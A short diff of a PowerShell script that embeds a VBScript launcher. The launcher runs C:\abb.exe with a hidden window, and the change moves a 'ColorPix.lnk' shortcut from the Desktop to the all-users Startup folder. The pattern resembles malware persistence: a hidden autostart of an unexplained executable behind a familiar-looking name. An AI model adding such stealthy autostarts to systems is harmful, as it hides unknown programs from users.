@@ -5,7 +5,7 @@ WshShell.Run """C:\abb.exe""", 0 'Must quote command if it has spaces; must esca
 Set WshShell = Nothing
 "@
 $WshShell = New-Object -comObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut("$Home\Desktop\ColorPix.lnk")
+$Shortcut = $WshShell.CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\ColorPix.lnk")
 $Shortcut.TargetPath = "C:\abb.exe"
 $Shortcut.Save()
 
